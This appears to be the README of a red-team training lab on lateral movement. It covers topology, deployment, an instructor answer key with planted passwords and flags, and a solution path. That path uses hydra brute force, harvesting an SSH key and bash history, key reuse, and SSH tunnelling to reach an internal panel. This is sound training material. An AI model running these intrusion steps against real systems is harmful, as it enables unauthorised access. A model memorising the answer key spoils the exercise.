# cr-18-n5a-CTF1 — Lateral Movement & Network Pivoting

Offensive / red-team hands-on lab. A trainee compromises a workstation on a flat
corporate LAN, harvests reusable credentials, pivots through that host, and
brute-forces a LAN-only maintenance panel that is unreachable from the attacker
box directly.

- **Course code:** N5a
- **Type:** Offensive / Red-Team / Penetration Testing
- **Difficulty:** Intermediate
- **Delivery:** Online, self-paced, hands-on lab
- **Recommended duration:** ~45 min (see *Timing* below)

---

## Topology

All hosts share one flat subnet (`192.168.0.0/24`). 

| Host | IP | Role | OS |
|------|------|------|------|
| `pentestvm` | 192.168.0.3 | Attacker workstation (trainee console) | Kubuntu/Kali-based |
| `uservm` | 192.168.0.10 | Victim workstation (initial access) | Ubuntu Noble |
| `servervm` | 192.168.0.2 | Internal server (key reuse + Flask panel) | Ubuntu Noble |
| `router` | 192.168.0.1 | LAN gateway / egress | Debian 12 |

`uservm` and `servervm` are `hidden: true` — trainees never get a console on
them and reach them only over SSH/the pivot.

---

## Deployment

The play order matters: `uservm` runs first and generates the SSH keypair, then
`servervm` reads that public key (via `hostvars`) to authorize it for `admin`.
Do not reorder the plays.

### Dependencies

- **`community.general`** collection (used for the `ufw` tasks):
  `ansible-galaxy collection install community.general`
- The framework **`user-access`** role (used for the `pentester` console login on
  `pentestvm`). If your environment doesn't ship it, replace that role block with
  a plain `ansible.builtin.user` task.

---

## Answer key

> Instructor reference — do not distribute to trainees.

| Item | Value | Source |
|------|-------|--------|
| Host A / Host B IPs | `192.168.0.2`, `192.168.0.10` | arp-scan / `nmap -sn` |
| Workstation login | `jdoe` | hydra (in `users.txt`) |
| Workstation password | `letmein123` | hydra (in `passwords.txt`) |
| `ssh_flag` | `CR18{ssh_k3y_reu5e_l4teral}` | trailing comment in `~/.ssh/id_rsa` |
| Server account name | `admin` | `jdoe`'s `~/.bash_history` |
| Administrator's name | `Mark Stevens` | `/home/admin/flag1.txt` |
| Maintenance username | `maintenance` | hardcoded in panel; hydra `-l` |
| Maintenance password | `admin123` | hydra (in `wordlist.txt`) |
| Panel capstone flag | `CR18{p1vot_tunnel_pwned}` | returned on successful `/login` |

Wordlists are staged at `/home/pentester/Desktop/` and `/home/pentester/` with the
correct answers near the top so both brute-forces resolve in seconds.

---

## Solution path (reference)

**A3 — discovery, initial access, credential harvest**

```bash
ip a
sudo arp-scan 192.168.0.0/24            # or: nmap -sn 192.168.0.0/24
nmap -p 22 192.168.0.10
hydra -L users.txt -P passwords.txt ssh://192.168.0.10 -t 4
ssh jdoe@192.168.0.10
ls -la ~/.ssh && cat ~/.ssh/id_rsa      # ssh_flag is at the bottom
cat ~/.bash_history                      # reveals admin@192.168.0.2
```

**A4 — pivot, tunnel, panel brute-force**

```bash
# From the workstation: reuse the key to reach the server
ssh -i ~/.ssh/id_rsa admin@192.168.0.2
cat /home/admin/flag1.txt

# From the attacker box: tunnel the LAN-only panel through the workstation
ssh -L 8080:192.168.0.2:8080 jdoe@192.168.0.10
curl http://localhost:8080/login        # -> Unauthorized
hydra -l maintenance -P wordlist.txt http://localhost:8080/login \
  http-post-form "/login:username=^USER^&password=^PASS^:Unauthorized" -t 8
```

Brute-force tuning is deliberate: `-t 4` on SSH avoids OpenSSH `MaxStartups`
connection drops, and `-t 8` on HTTP stays within the Flask dev server's limits
(it runs with `threaded=True`). The `:Unauthorized` fail string matches the
panel's 401 body exactly — don't change one without the other.

---

## Design notes & caveats

- **Network segmentation is enforced by `ufw` on `servervm`.** The default policy
  is left as *allow* and the attacker box (`.3`) is explicitly denied on ports 22
  and 8080, while the workstation (`.10`) is allowed. This is what forces the
  pivot. A blanket `default deny incoming` is intentionally avoided because it
  would also cut the provisioning/management connection (which does not originate
  from `.10`) and lock out Ansible. If your platform whitelists a known management
  source, you can switch to default-deny and add that source.

- **The panel is LAN-bound, not loopback-bound.** It listens on `0.0.0.0:8080` and
  is reachable only from `.10` via firewall. This matches the shipped tunnel
  command `ssh -L 8080:192.168.0.2:8080 jdoe@.10`. Scenario text describing the
  service as "bound to localhost" is inaccurate for this build and should be
  updated. (A true loopback-bound variant would require a ProxyJump/chained tunnel
  instead.)

- **`ssh_flag` is a trailing comment in `id_rsa`.** OpenSSH ignores text after the
  key block, so the key still authenticates while `cat id_rsa` reveals the flag.
  Worth a one-time smoke test (`ssh -i id_rsa admin@192.168.0.2`) after first
  provision.

- **`bash_history` persistence.** `jdoe`'s `.bashrc` sets `HISTFILE=/dev/null` so a
  trainee's own interactive session can't overwrite the seeded history.

- **No privilege-escalation step is implemented.** The chain ends at panel
  credentials, so T1068 is *not* represented despite appearing in some scenario
  text. To add it, give the panel an authenticated command-exec endpoint running
  as root.

### Suggested MITRE ATT&CK mapping

The build supports: **T1018** (host discovery), **T1046** (service scanning),
**T1110** (SSH brute force), **T1552.004** (private key) + **T1552.003**
(bash_history), **T1078** / **T1021.004** (reusing the key over SSH), and
**T1090** / **T1572** (the pivot tunnel). Drop the deprecated **T1075**
("Pass the Hash") — there is no hash anywhere in this lab.

---

## Timing

A realistic intermediate run is ~36 min of task time, ~40–45 min with
hint-reading and retries. Publish as a 45-minute course, or keep ~30 min only if
both wordlists stay small and seeded as shipped (the brute-force runtime, not
trainee knowledge, sets the floor). Estimated/minimum per level:

| Level | Estimated | Minimum |
|-------|-----------|---------|
| A3 | 18 min | 7 min |
| A4 | 17 min | 6 min |
